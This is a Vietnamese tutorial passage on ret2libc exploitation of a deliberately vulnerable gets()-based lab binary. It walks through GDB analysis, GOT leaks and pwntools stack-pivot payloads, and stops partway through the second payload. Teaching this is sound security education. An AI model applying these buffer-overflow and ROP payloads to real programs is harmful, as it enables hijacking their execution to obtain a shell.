<h1 style="text-align: center;">Ret2libc</h3>

Bài viết này sẽ trình bày những gì mình biết để khai thác lỗi ret2libc cơ  bản.
<hr>

## Ret2libc (NO PIE, NO CANARY)

Để dễ hình dung chúng ta sẽ đến với một challenge đơn giản.

**vuln.c**

```c
#include <stdio.h>
#include <stdlib.h>

void portal_gate() {
    char password[40];
    puts("Nhập mật khẩu để mở cổng:");
    gets(password);
    printf("Mật khẩu '%s' không đúng!\n", password);
}

int main() {

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    puts("Chào mừng đến với Cánh Cổng Dịch Chuyển!");
    portal_gate();

    return 0;
}
```


Chạy lệnh biên dịch

```gdb
gcc vuln.c -no-pie -fno-stack-protector -o vuln
```

---

## I. Phân tích ban đầu

### Kiểm tra các cơ chế bảo mật

```gdb
 checksec --file vuln
```

```gdb
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

* Ta thấy `NX` đã được bật. Điều đó có nghĩa là không thể chạy shellcode tùy ý nữa. Như vậy cần sử dụng `ROP` (Return-Oriented Programming) để kết hợp các `gadgets` (đoạn mã assembly có sẵn trong chương trình) để điều khiển luồng chương trình gọi hàm `system()` ở `libc`
* `SHSTK` và `IBT` tuy được đánh dấu `Enabled` nhưng mặc định thì máy tính của bạn thường ở chế độ tắt 2 cái này.
* `Canary` đã bị tắt bằng `-fno-stack-protector`, tạo điều kiện cho lỗi overflow có thể ghi đè vượt khỏi phạm vi stack frame của hàm.
* `PIE` (Position Independent Executable) đã được tắt, điều này giúp việc khai thác trở nên thuận lợi hơn, vì các địa chỉ của file binary `vuln` sẽ giữ nguyên ở các lần chạy. 

$\rightarrow$ Tuy vậy cần chú ý rằng `ASLR` và `PIE` của `libc` và `dynamic linker` vẫn được bật nên các địa chỉ được nạp vào từ `libc` và `dynamic linker` vẫn sẽ random.

* `Partial RELRO`: Tạo điều kiện cho việc ghi đè `GOT`, nhưng tạm thời trong bài này ta sẽ chưa nói đến.

### Tìm hàm có thể gây lỗi:

* Dễ dàng nhìn thấy hàm `gets()` là một hàm có lỗi bảo mật kinh điển, buffer overflow. Ở chương trình trên, `Canary` bị tắt nên ta có thể tận dụng lỗi buffer overflow để điều khiển chương trình, sử dụng kỹ thuật `ROP`.

### Một chút khác biệt giữa mã nguồn gốc và giả mã của IDA Pro

Khi ném file binary vào IDA Pro ta thấy sự khác biệt của độ dài buffer, `buf[40]` và `buf[48]`.

Phân tích file hàm `portal_gate()` của binary bằng IDA ta được:

```c
int portal_gate()
{
  _BYTE v1[48]; // [rsp+0h] [rbp-30h] BYREF

  puts(s);
  gets(v1);
  return printf(format, v1);
}
```

Như vậy có thể thấy, do khi biên dịch chương trình ta đã tắt `Canary` đi bằng cờ `-fno-stack-protector` nên địa chỉ không đúng theo theo Alignment 16-byte, 8 byte padding dưới đây là để căn chỉnh. 

```rust

    (Bottom of Stack)
           |
           v
+-----------------------+
|    Return Address     |  # 8 byte (Địa chỉ trả về - RIP)
+-----------------------+
|       Saved RBP       |  # 8 byte (Base Pointer cũ)
+-----------------------+  
|    Padding (8 byte)   | <--- Padding để căn chỉnh Stack Alignment 16-byte
+ - - - - - - - - - - - +
|                       |
|       buf[40]         | 
|                       |
+-----------------------+  
           ^
           |
    Low Address (Top of Stack)
```

Về mặt khai thác trong bài này, ta cứ tạm coi cái biến buf có 48 byte cũng được, dù sao nó cũng không ảnh hưởng gì nhiều.

> **<u style="color: red;">Stack-Alignment</u>**: Trong chuẩn **ABI** (Application Binary Interface) của hệ điều hành **<b style="color: orange;">64-bit</b>** (Linux, macOS...), quy tắc là: Thanh ghi `RSP` (Stack Pointer) phải chia hết cho 16 (tức là kết thúc bằng số 0 ở hệ hex) ngay trước khi thực hiện lệnh call để gọi một hàm mới.

---

## II. Khai thác

### 1. Các giai đoạn của cuộc khai thác

* Ta đã biết bài này `NX` được bật nên cần dùng kĩ thuật `ROP`. Muốn dùng được `ROP` thì phải biết địa chỉ các hàm cần tìm trong `libc`. Như vậy trước hết ta cần điều khiển chương trình sao cho in ra địa chỉ nào đó của `libc`, từ đó tìm ra địa chỉ base của `libc` và địa chỉ của hàm `system()`.
* Sau khi đã có địa chỉ `libc` ta sẽ sắp xếp payload gọi `system("/bin/sh")` để có shell.

### 2. Bắt đầu khai thác

**Leak địa chỉ**

* Nếu chỉ nhìn vào code C thì rất khó hình dung nên ta cứ bật GDB để `disassemble` ra code `asm` cho dễ.

```asm
pwndbg> disas
Dump of assembler code for function portal_gate:
   0x0000000000401196 <+0>:     endbr64
   0x000000000040119a <+4>:     push   rbp
   0x000000000040119b <+5>:     mov    rbp,rsp
   0x000000000040119e <+8>:     sub    rsp,0x30
   0x00000000004011a2 <+12>:    lea    rax,[rip+0xe5f]        # 0x402008
   0x00000000004011a9 <+19>:    mov    rdi,rax
   0x00000000004011ac <+22>:    call   0x401070 <puts@plt>
   0x00000000004011b1 <+27>:    lea    rax,[rbp-0x30]
   0x00000000004011b5 <+31>:    mov    rdi,rax
   0x00000000004011b8 <+34>:    mov    eax,0x0
   0x00000000004011bd <+39>:    call   0x401090 <gets@plt>
   0x00000000004011c2 <+44>:    lea    rax,[rbp-0x30]
   0x00000000004011c6 <+48>:    mov    rsi,rax
   0x00000000004011c9 <+51>:    lea    rax,[rip+0xe60]        # 0x402030
   0x00000000004011d0 <+58>:    mov    rdi,rax
   0x00000000004011d3 <+61>:    mov    eax,0x0
   0x00000000004011d8 <+66>:    call   0x401080 <printf@plt>
   0x00000000004011dd <+71>:    nop
   0x00000000004011de <+72>:    leave
   0x00000000004011df <+73>:    ret
End of assembler dump.
```

$\rightarrow$ Nhìn vào hàm thấy rằng nếu dùng hàm `puts()` để leak, ta cần tính toán làm sao truyền `rdi` vào. Tuy vậy việc này sẽ phức tạp hơn là sử dụng đoạn gọi hàm `printf()` phía dưới, vì `printf()` chấp nhận in ra địa chỉ mà `rbp-0x30` trỏ đến, thứ mà ta có thể tận dụng lỗi overflow để ghi đè `rbp`. Từ đó in ra địa chỉ mong muốn.

> `printf("Mật khẩu '%s' không đúng!\n", password);}`

* Vậy giờ cần làm gì với cái `rbp-0x30`? Mục tiêu của ta là leak được 1 địa chỉ trong `libc`. Vì bài này PIE đã bị tắt cho nên ta có thể làm sao để truyền một địa chỉ ở `.got.plt` (cố định mỗi lần chạy do NO PIE) vào `rsi`. Mỗi địa chỉ đó trỏ đến một địa chỉ hàm trong `libc` nên ta có thể tận dụng điều này để leak.

> Đọc thêm về `GOT` và `PLT` ở <u><a href="https://github.com/thecommenter297/pwn.college_Program_Security/blob/main/Bai4-Memory-Corruption-Resources.md#2-gi%E1%BA%A3i-ph%E1%BA%ABu-c%E1%BA%A5u-tr%C3%BAc-ch%C3%BAng-l%C3%A0-g%C3%AC-v%C3%A0-tr%C3%B4ng-nh%C6%B0-th%E1%BA%BF-n%C3%A0o">đây</a></u>

* Kiểm tra bằng lệnh `got` của `pwndbg`

```asm
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/khanh/train/vuln:
GOT protection: Partial RELRO | Found 4 GOT entries passing the filter
[0x404000] puts@GLIBC_2.2.5 -> 0x7ffff7c87be0 (puts) ◂— endbr64
[0x404008] printf@GLIBC_2.2.5 -> 0x401040 ◂— endbr64
[0x404010] gets@GLIBC_2.2.5 -> 0x401050 ◂— endbr64
[0x404018] setvbuf@GLIBC_2.2.5 -> 0x7ffff7c88550 (setvbuf) ◂— endbr64
```

$\rightarrow$ Bạn có thể tùy chọn `0x404000`, `0x404008`, `0x404010`, `0x404018` để đưa vào `rsi`. Tóm lại chọn cái nào cũng được. Riêng mình thì mình chọn `setvbuf` (`0x404018`) vì nó không có NULL byte như của `puts` (`0x404000`). Việc dính NULL byte trong payload có thể sẽ dẫn đến khá nhiều vấn đề, đặc biệt là khi ta đang muốn tận dụng hàm `printf` để leak địa chỉ.

---

<details>
<summary>Tại sao cần phải dùng Stack Pivot dài dòng để làm gì? </summary>

<br>

> Phần này chỉ là để giả định sai lầm.

Vậy thì như bên trên đã nói, chẳng phải là dễ leak rồi sao? Chỉ cần điều khiển `rbp` để `rsi` nó trỏ đến cái cần thiết. Giờ viết payload được chưa?

```python
from pwn import *

context.arch = 'amd64'
binary = './vuln'
elf = ELF(binary)
p = process(binary)


setvbuf_got = 0x404018 # địa chỉ .got.plt của setvbuf
main_addr = 0x4011e0 # địa chỉ của hàm main
lea_printf = 0x4011c2 # địa chỉ lúc chuẩn bị để gọi printf

payload1 = b'A'*48
payload1 += p64(setvbuf_got+0x30) # Cộng thêm 0x30 để rsi trỏ đến đúng chỗ
payload1 += p64(lea_printf) # Sau khi chạy xong hàm portal_gate lần đầu thì quay về printf để leak
p.sendlineafter(b'ng:', payload1)

# Tách địa chỉ
p.recvuntil(b"!\n")
p.recvuntil("Mật khẩu '".encode("utf-8"))
leak = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f"Setvbuf leak: {hex(leak)}")
p.recvuntil(b"!\n")

p.interactive()
```

```bash
user:~/CTF$ python train.py
[*] '/home/user/CTF/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './vuln': pid 45123
[+] Setvbuf leak: 0x759648488550
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 45123)
[*] Got EOF while sending in interactive
```

Địa chỉ libc in ra rồi. Nhưng `SIGSEGV` luôn. Tại sao?

* Đoạn `leave; ret` trước khi kết thúc hàm `portal_gate` lần đầu tiên.
![image](https://hackmd.io/_uploads/S1uAAjzJzg.png)
* Đoạn `leave; ret` trước khi kết thúc hàm `portal_gate` lần 2.
![image](https://hackmd.io/_uploads/HyqMJ2z1fx.png)
![image](https://hackmd.io/_uploads/S1PmJ2MkGg.png)

Well. Vậy là đã hiểu sao dính `SIGGSEGV`. Là do `rip` trỏ đến địa chỉ không hợp lệ.
![image](https://hackmd.io/_uploads/SJE-e2G1fe.png)

Việc để `rbp` trỏ lên vùng `.bss` đã làm `rsp` cũng bị nhảy lên đây theo, thông qua lệnh `leave; ret`. Thành ra vùng mà vốn dĩ `rsp` trỏ đến để lưu return address đã bị thay thế bằng rất nhiều vùng NULL.

Thế nên quyết định chúng ta cần dùng kỹ thuật **STACK PIVOT** để leak địa chỉ.

---

</details>

**Kỹ thuật Stack Pivot**

* Vì chúng ta sẽ thao túng `rbp` để thực hiện kỹ thuật này, nên trước hết cần kiểm tra xem binary này có những gadget nào để kiểm soát `rbp` đã.

```bash
ROPgadget --binary vuln | grep "rbp"
```

```csharp
0x000000000040123e : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040117a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401240 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040117b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401179 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040117c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401177 : add eax, 0x2ecb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401176 : mov byte ptr [rip + 0x2ecb], 1 ; pop rbp ; ret
0x000000000040123d : mov eax, 0 ; pop rbp ; ret
0x000000000040117d : pop rbp ; ret
```

```bash
ROPgadget --binary vuln | grep "leave"
```

```csharp
0x00000000004011de : leave ; ret
0x00000000004011dd : nop ; leave ; ret
```

Như vậy là đã xác định có 2 gadget hữu dụng cho việc điều khiển `rbp` là `leave; ret` và `pop rbp; ret`.

* Để thực hiện kỹ thuật stack pivot, chúng ta cần tới 2 payload để setup cái return address vào đúng chỗ, sao cho sau khi quay lại gọi `printf` để leak `libc`, thì sẽ quay trở lại gọi `_start` hoặc `main`. Thêm 1 payload nữa sau khi đã có địa chỉ `libc` để gọi shell nữa là có tổng cộng 3 payload.
* Lệnh gọi để tạo template cho file exploit: 

```csharp
pwn template ./vuln --quiet > exploit.py
```

---

#### Payload đầu tiên: Đưa `rbp` về `.bss`

Ở payload này thì đoạn quan trọng nhất là việc chọn `rbp` phù hợp.

Có một vài tiêu chí khi chọn ghi đè `rbp` phục vụ việc leak địa chỉ `libc`:

* Tiêu chí 1: Chọn `rbp` để ghi dữ liệu đúng ý
    * Bạn muốn `gets` ghi dữ liệu vào vùng `target_address`, thì cần phải chọn `rbp` = `target` + `offset`, (dễ hiểu là vì phần `rbp-0x30`). Đây cũng chính là vùng sẽ chứa payload2 của bạn.
    **Ví dụ**: Để `rbp - 0x30` = `0x404050`, thì bạn bắt buộc phải chọn `rbp` = `0x404080`.

* Tiêu chí 2: Đủ chỗ cho lệnh `ret`:
    * Để ý lệnh `leave; ret` ở cuối hàm:
        * Lệnh `leave` tương đương với `mov rsp, rbp; pop rbp`
        * Do có `mov rsp, rbp` nên `rsp` = `rbp`, do `pop rbp` nên `rsp` tăng thêm 8 
        > Việc hiểu `leave` như 2 lệnh riêng lẻ `mov rsp, rbp; pop rbp` sẽ giúp dễ tưởng tượng hơn.
        > 
        > Nói đơn giản thì lệnh `leave` có 3 ý nghĩa:
        > * (1). Cho `rsp` = `rbp`
        > * (2). Thông qua điều (1), để lại địa chỉ `rbp+8` dành cho lệnh `ret`. Vậy `return_address = rbp+8`
        > * (3). Cuối cùng cho `rbp` = `[rsp-8]` = `[rbp]` (Lấy giá trị mà `rbp` đang trỏ tới để`pop` vào `rbp`).
        
        * Cuối cùng `ret` sẽ lấy giá trị hiện tại để nhảy.

    $\rightarrow$ Như vậy vùng dữ liệu `rbp+8` trỏ tới phải là vùng nhớ bạn **có quyền kiểm soát và ghi dữ liệu** được.

* Tiêu chí 3: Phải có `return address` phục vụ cho mục tiêu leak `libc`
    * Vì sau khi gọi `printf()` vẫn có lệnh `leave; ret` nên ta lại có được: `return address = target_got+offset+8 = printf_rbp+8`
    * Như vậy giá trị mà vùng nhớ `target_got+offset+8` trỏ tới chắc chắn phải được sắp đặt thành `return address` trước khi gọi `printf()`
    * Từ đó xác định rằng ở giai đoạn "ghi dữ liệu" bằng `gets()`, ta sẽ tìm cách điều chỉnh `rbp` để ghi `return address` đúng chỗ cho `printf()` đáp xuống.

* Tiêu chí 4: Chọn vùng pivot an toàn
    * Chọn địa chỉ `rbp` sao cho:
        * Vùng nhớ `[rbp - offset]` đến `[rbp - offset + Độ dài Payload]` không được giao thoa với các con trỏ hệ thống.
        * Do bảng `GOT` thường nằm ở đầu vùng data/bss nên nếu chọn `rbp` quá thấp sẽ ghi đè vào các địa chỉ hàm gây crash.


Trong challenge `vuln` này, với payload1 ta chọn `rbp` = `0x404080` cho lần quay lại `gets` đầu tiên vì:
* Hàm `gets` sẽ ghi dữ liệu vào `0x404050` (`0x404080 - 0x30`)
* Địa chỉ `0x404050` = `setvbuf+0x30+8`, thuận tiện để đặt `return address` ở payload2 cho `printf` đáp xuống. Đồng thời nó nằm sau con trỏ `stdin` (`0x404040`), đảm bảo không làm hỏng luồng nhập liệu.
* Từ `0x404050` trở đi là vùng `.bss` trống trải, đủ chỗ để dựng một ROP chain dài (payload 2) mà không sợ bị cắt ngang.
![image](https://hackmd.io/_uploads/SJJssNVkzx.png)



```python
io = start()

# --- STAGE 1: ĐƯA RBP VỀ BSS ---
log.info("Step 1: Overwriting RBP")
payload1 = b'A' * 48
payload1 += p64(0x404080)        # RBP = 0x404080 => 0x404050 sẽ chứa payload2
payload1 += p64(portal_gate_gets) # Nhảy lại gets

io.recvuntil(b":\n")
io.sendline(payload1)

# Xóa output rác do đợt in sai đầu tiên
io.recvuntil(b"!\n") 
```

<details>
<summary>Hình minh họa cho dữ liệu trên `stack` và `bss` </summary>

---

* Cái hướng phát triển của stack ở hình dưới được viết ngược lại so với cái hình ban đầu. Tuy vậy ý nghĩa thì vẫn giống nhau (thực ra ta đang lấy vùng `bss` làm stack chứ nó không thật sự là stack).



```rust

=========================
=========BSS ZONE========
=========================

Low Address (Top of "Stack on BSS")
             |
             v
           
+--------------------------+  <--- 0x404000 
| [0x404000] puts@GLIBC    |  # => 0x7ffff7c87be0 (puts)
+--------------------------+
| [0x404008] printf@GLIBC  |  # => 0x7ffff7c60100 (printf)
+--------------------------+
| [0x404010] gets@GLIBC    |  # => 0x7ffff7c87080 (gets)
+--------------------------+
| [0x404018] setvbuf@GLIBC |  # => 0x7ffff7c88550 (setvbuf)
+--------------------------+
| [0x404020]  data_start   |  # => 0 
+--------------------------+
|           ...            |  
+--------------------------+  
|  [0x404048] completed    |  # => 0
+--------------------------+  <-- 0x404050 = 0x404080-0x30 (Nơi ghi payload2)
|                          |
|                          | 
|                          |
+--------------------------+  
             ^
             |
(Bottom of "Stack on BSS" - High Address)          

          ...

========================
========STACK ZONE======
========================

Low Address (Top of Stack)
           |
           v
+-----------------------+ <--- 0x7fff.... (Nơi ghi payload1)
|        buf[48]        |  # A * 48 => 48 byte (Tạm coi buf[48] cũng được)
+-----------------------+
|       Saved RBP       |  # 0x404080: Đích đến của stack pivot
+-----------------------+  
|    Return Address     | <--- # portal_gate_gets (Quay về nhận payload2)
+-----------------------+
            ^
            |
(Bottom of Stack - High Address)          
```

</details>

#### Payload thứ hai: Leak địa chỉ `libc`
* Payload1 đã giúp ta quay lại đoạn gọi `gets` để nhận input lần tiếp theo. Sau khi quay lại `gets`, đoạn gọi `gets` và lệnh `leave; ret` ở `portal_gate` sẽ được thực thi, sau lệnh `leave; ret` đó thì lúc này `rbp` là `0x404080`, `rsp` trỏ tới đỉnh stack là `0x404088`

> * Thử nhập 'aaa' để quan sát vùng sẽ ghi payload2
> ![image](https://hackmd.io/_uploads/Skv9yjEJfe.png)

> * Xem trạng thái lúc chuẩn bị gọi `ret` sau khi nhập 'aaa'
> ![image](https://hackmd.io/_uploads/SkbH1xUkMl.png)

* Nói ngắn gọn thì, đoạn lệnh `leave; ret` trong hình đã giúp ta đảm bảo rằng `return address` chắc chắn rơi vào `0x404088` như đã dự tính.
* Như vậy là giờ ta cần quan tâm làm sao để điều khiển chương trình tiếp tục.

**Giai đoạn 1**: Chuẩn bị sau khi `printf` đã leak địa chỉ `libc`
* Điều đầu tiên ta cần chuẩn bị cho `printf` là `return address`. Việc chọn `rbp` ở payload1 là để nó ghi được `return address` vào lúc chương trình gọi xong `printf` để leak địa chỉ `libc`. Vậy điều khiển được `return address` ở khúc đó xong rồi thì phải làm những gì?
    * Thứ nhất, phải đảm bảo lúc gọi `printf()` xong và quay lại, ta phải điều khiển cho `rsp` ở 1 địa chỉ **đủ cao** để việc **gọi hàm khác** diễn ra thuận lợi. Vì việc gọi hàm diễn ra sẽ kéo theo việc stack sẽ bị chiếm dụng nhiều hơn, mọc thêm nhiều hơn, do phải dựng thêm stack frame cho hàm, mà `0x404050` lại quá gần các địa chỉ `got` quan trọng và vùng chỉ có quyền `read`. 
    * Thứ hai, sau khi đảm bảo điều khiển được `rsp` lên cao, ta phải "thiết kế" được `return address` để **quay về `_start` hoặc `main`** để gửi payload3 thực hiện gọi shell.

* Rồi, giờ ta sẽ xử lý từng vấn đề. Giải quyết đoạn "đảm bảo `rsp` đủ cao"  trước.
    
    <details>
      <summary>Giải thích sự kết hợp giữa chuỗi gadget `pop rbp; ret` và `leave; ret`.</summary>
    
    ---
    
    Ở đây trước hết cần nói về sự kết hợp giữa chuỗi gadget `pop rbp; ret` và `leave; ret`.
    * Gadget `pop rbp; ret` và `leave; ret` có nhiệm vụ:
        * Đảm bảo `rsp` sẽ mang giá trị vùng nhớ `target_rbp+8` đúng ý.
        > **Note**: Tuy `pop rbp; ret` có giúp cài đặt `rbp` nhưng đó chỉ là tiền đề để <u>gài sẵn cho `leave` cài đặt `ret_address = target_rbp + 8`</u>. Như vậy `pop rbp; ret` là 1 bước đệm quan trọng để kết hợp với `leave; ret`.
    * Gadget `leave; ret`, với lệnh `leave` còn có 1 nhiệm vụ quan trọng trong sự kết hợp này:
        * Cài đặt `rbp`  = `target_rbp` = `ret_address - 8`
        > **Note**: 
        > * Tại sao đến đây mới là đoạn cài đặt `rbp` ? Như đã nói lệnh `leave` thực ra là `mov rsp, rbp; pop rbp`. Vậy chắc chắn sau khi `pop rbp` thì `rbp = [rbp] = target_rbp`.
        > * Vậy điều đó có ý nghĩa gì? Nghĩa là chúng ta phải đặt cả `target_rbp` ở địa chỉ `ret_address-8` nữa chứ mỗi cái `target_rbp` như giờ là chưa đủ. Nói thì hơi khó hình dung chứ thực ra là đặt cái địa chỉ 8 byte ngay trước `ret_address` thôi. 
        
    ```c  
    payload += p64(pop_rbp_ret)
    payload += p64(target_rbp)
    payload += p64(leave_ret)
    ```
    
    > Thế cái đoạn đặt thêm một `target_rbp` nữa đâu? Tí nữa tính đặt sau. Còn giờ công đoạn này tạm như vậy đã.

    </details>

```python
io = start()

# --- STAGE 1: ĐƯA RBP VỀ BSS ---
log.info("Step 1: Overwriting RBP")
payload1 = b'A' * 48
payload1 += p64(0x404080)        # RBP = 0x404080 => 0x404050 sẽ chứa payload2
payload1 += p64(portal_gate_gets) # Nhảy lại gets

io.recvuntil(b":\n")
io.sendline(payload1)

# Xóa output rác do đợt in sai đầu tiên
io.recvuntil(b"!\n") 

# --- STAGE 2: XÂY DỰNG CÁC GADGET ADDRESS TRÊN BSS, LEAK LIBC ---

# =========== Nửa đầu tiên của Giai đoạn 1 ===============
payload2 = p64(pop_rbp_ret)    # 0x404050: RIP
payload2 += p64(0x404900)      
payload2 += p64(leave_ret)     # Bật RSP lên 0x404900
payload2 += b'B' * 32          # Thừa 32 byte, cứ để đó vậy
```


<details>
<summary> Tổng quan memory layout hiện tại:</summary>

```rust

=========================
=========BSS ZONE========
=========================

Low Address (Top of "Stack on BSS")
             |
             v
           
+--------------------------+  <--- 0x404000 
| [0x404000] puts@GLIBC    |  # => 0x7ffff7c87be0 (puts)
+--------------------------+
| [0x404008] printf@GLIBC  |  # => 0x7ffff7c60100 (printf)
+--------------------------+
| [0x404010] gets@GLIBC    |  # => 0x7ffff7c87080 (gets)
+--------------------------+
| [0x404018] setvbuf@GLIBC |  # => 0x7ffff7c88550 (setvbuf)
+--------------------------+
| [0x404020]  data_start   |  # => 0 
+--------------------------+
|           ...            |  
+--------------------------+
|  [0x404048] completed    |  # => 0
+--------------------------+  <-- 0x404050 = 0x404080-0x30 (Nơi ghi payload2)
|       pop_rbp_ret        |
+--------------------------+
|        0x404900          |
+--------------------------+
|        leave_ret         |
+--------------------------+
|                          |
|           B*32           | #  Thừa 32 byte, cứ để đó vậy
|                          |
|                          |
+--------------------------+ <- 0x404088 (0x404050->0x404088 vừa đủ 56 byte)
             ^
             |
(Bottom of "Stack on BSS" - High Address)          

          ...

========================
========STACK ZONE======
========================

Low Address (Top of Stack)
           |
           v
+-----------------------+ <--- 0x7fff.... (Nơi ghi payload1)
|        buf[48]        |  # A * 48 => 48 byte (Tạm coi buf[48] cũng được)
+-----------------------+
|       Saved RBP       |  # 0x404080: Đích đến của stack pivot
+-----------------------+  
|    Return Address     | <--- # portal_gate_gets (Quay về nhận payload2)
+-----------------------+
            ^
            |
(Bottom of Stack - High Address)          

```

</details>

<br>

* Giờ thì xử lý tiếp đoạn làm sao để "thiết kế" được `return address` để quay về `_start` hoặc `main` để gửi payload3.
    * Ở phần trước đã quyết định cho `rbp` lên tận `0x404900` nên chắc chắn ta cần đủ nhiều byte rác để đẩy `ret_address` lên cao như vậy
    * Và nhớ rằng cần đặt cả `target_rbp` ở địa chỉ `ret_address-8` để `leave` tự động gán `rbp` = `target_rbp`. Cái `target_rbp` này là để chuẩn bị cho `printf` để leak địa chỉ `libc` luôn.

```python

io = start()

# --- STAGE 1: ĐƯA RBP VỀ BSS ---
log.info("Step 1: Overwriting RBP")
payload1 = b'A' * 48
payload1 += p64(0x404080)        # RBP = 0x404080 => 0x404050 sẽ chứa payload2
payload1 += p64(portal_gate_gets) # Nhảy lại gets

io.recvuntil(b":\n")
io.sendline(payload1)

# Xóa output rác do đợt in sai đầu tiên
io.recvuntil(b"!\n") 

# --- STAGE 2: XÂY DỰNG CÁC GADGET ADDRESS TRÊN BSS, LEAK LIBC ---

# =========== Nửa đầu tiên của Giai đoạn 1 ===============
payload2 = p64(pop_rbp_ret)    # 0x404050: RIP
payload2 += p64(0x404900)      
payload2 += p64(leave_ret)     # Bật RSP lên 0x404900
payload2 += b'B' * 32          # Thừa 32 byte, cứ để đó vậy

# ================Byte rác/Padding căn chỉnh===========
payload2 += b'C' * 2168 # Đúng bằng khoảng cách 0x404800 - 0x4040a0

# ===============Nửa còn lại của Giai đoạn 1=============
# Gọi lại Main an toàn (Tại 0x404900)
payload2 += p64(0x404900)      # 0x404900: Đặt đúng RBP an toàn
payload2 += p64(main_addr)     # 0x404908: Trở về main!
```

<details>
<summary> Tổng quan memory layout giai đoạn 1:</summary>

```rust
=========================
=========BSS ZONE========
=========================

Low Address (Top of "Stack on BSS")
             |
             v
           
+--------------------------+  <--- 0x404000
| [0x404000] puts@GLIBC    |  # => 0x7ffff7c87be0 (puts)
+--------------------------+
| [0x404008] printf@GLIBC  |  # => 0x7ffff7c60100 (printf)
+--------------------------+
| [0x404010] gets@GLIBC    |  # => 0x7ffff7c87080 (gets)
+--------------------------+
| [0x404018] setvbuf@GLIBC |  # => 0x7ffff7c88550 (setvbuf)
+--------------------------+
| [0x404020]  data_start   |  # => 0 
+--------------------------+
|           ...            |  
+--------------------------+
|  [0x404048] completed    |  # => 0
+--------------------------+  <-- 0x404050 = 0x404080-0x30 (Nơi ghi payload2)
|       pop_rbp_ret        |
+--------------------------+
|        0x404900          |
+--------------------------+
|        leave_ret         |
+--------------------------+
|                          |
|           B*32           | #  Thừa 32 byte, cứ để đó vậy
|                          |
+--------------------------+ <- 0x404088 (0x404050->0x404088 vừa đủ 56 byte)
|                          |
|          C*2168          |
|                          |
|            ...           |
|                          |
|                          |
|                          |
|                          |
|                          |
|                          |
|                          |
+--------------------------+ <-- 0x404900
|  0x404900 (RBP an toàn)  |
+--------------------------+ <-- 0x404908
|    main (ret_address)    |
+--------------------------+
             ^
             |
(Bottom of "Stack on BSS" - High Address)          

          ...

========================
========STACK ZONE======
========================

Low Address (Top of Stack)
           |
           v
+-----------------------+ <--- 0x7fff.... (Nơi ghi payload1)
|        buf[48]        |  # A * 48 => 48 byte (Tạm coi buf[48] cũng được)
+-----------------------+
|       Saved RBP       |  # 0x404080: Đích đến của stack pivot
+-----------------------+  
|    Return Address     | <--- # portal_gate_gets (Quay về nhận payload2)
+-----------------------+
            ^
            |
(Bottom of Stack - High Address)          

```

---

</details>

**Giai đoạn 2**: Dùng `printf()` để leak địa chỉ `libc`

* Giống như giai đoạn 1, ở đây cũng chia ra làm 2 phần:
    * Bật `rsp` lên cao rồi mới gọi `printf` để tránh bị crash.
    * Gọi `printf` để leak địa chỉ `libc`
* Đầu tiên là đưa `rsp` lên cao để tránh crash.
    
    > Lúc nãy đã thiết kế cho `rsp` bật lên cao vào khoảng `0x404900`. Vậy bây giờ để giãn cách chút, ta sẽ chọn khoảng `0x404800`
    
```python

io = start()

# --- STAGE 1: ĐƯA RBP VỀ BSS ---
log.info("Step 1: Overwriting RBP")
payload1 = b'A' * 48
payload1 += p64(0x404080)        # RBP = 0x404080 => 0x404050 sẽ chứa payload2
payload1 += p64(portal_gate_gets) # Nhảy lại gets

io.recvuntil(b":\n")
io.sendline(payload1)

# Xóa output rác do đợt in sai đầu tiên
io.recvuntil(b"!\n") 

# --- STAGE 2: XÂY DỰNG CÁC GADGET ADDRESS TRÊN BSS, LEAK LIBC ---

# =========== Nửa đầu tiên của Giai đoạn 1 ===============
payload2 = p64(pop_rbp_ret)    # 0x404050: RIP
payload2 += p64(0x404900)      
payload2 += p64(leave_ret)     # Bật RSP lên 0x404900
payload2 += b'B' * 32          # Thừa 32 byte, cứ để đó vậy

# =============== Nửa đầu tiên của Giai đoạn 2==========
payload2 += p64(pop_rbp_ret)        # 0x404088: RIP 
payload2 += p64(0x404800)           # 0x404090: Pop vào RBP = 0x404800
payload2 += p64(leave_ret)          # 0x404098: Bật RSP vọt lên 0x404800!

# ==========Byte rác/Padding căn chỉnh lên 0x404800=======
payload2 += b'C' * 1888 # Đúng bằng khoảng cách 0x4040a0 --> 0x404800

# ==============Nửa còn lại của Giai đoạn 2===============
# ================== CÒN THIẾU ===========================

# ==========Byte rác/Padding lấp đầy lên 0x404900=========
# ================== CÒN THIẾU ===========================

# ===============Nửa còn lại của Giai đoạn 1=============
# Gọi lại Main an toàn (Tại 0x404900)
payload2 += p64(0x404900)      # 0x404900: Đặt đúng RBP an toàn
payload2 += p64(main_addr)     # 0x404908: Trở về main!
```

<details>
<summary> Minh họa Memory Layout</summary>

```rust
=========================
=========BSS ZONE========
=========================

Low Address (Top of "Stack on BSS")
             |
             v
           
+--------------------------+  <--- 0x404000
| [0x404000] puts@GLIBC    |  # => 0x7ffff7c87be0 (puts)
+--------------------------+
| [0x404008] printf@GLIBC  |  # => 0x7ffff7c60100 (printf)
+--------------------------+
| [0x404010] gets@GLIBC    |  # => 0x7ffff7c87080 (gets)
+--------------------------+
| [0x404018] setvbuf@GLIBC |  # => 0x7ffff7c88550 (setvbuf)
+--------------------------+
| [0x404020]  data_start   |  # => 0 
+--------------------------+
|           ...            |  
+--------------------------+
|  [0x404048] completed    |  # => 0
+--------------------------+  <-- 0x404050 = 0x404080-0x30 (Nơi ghi payload2)
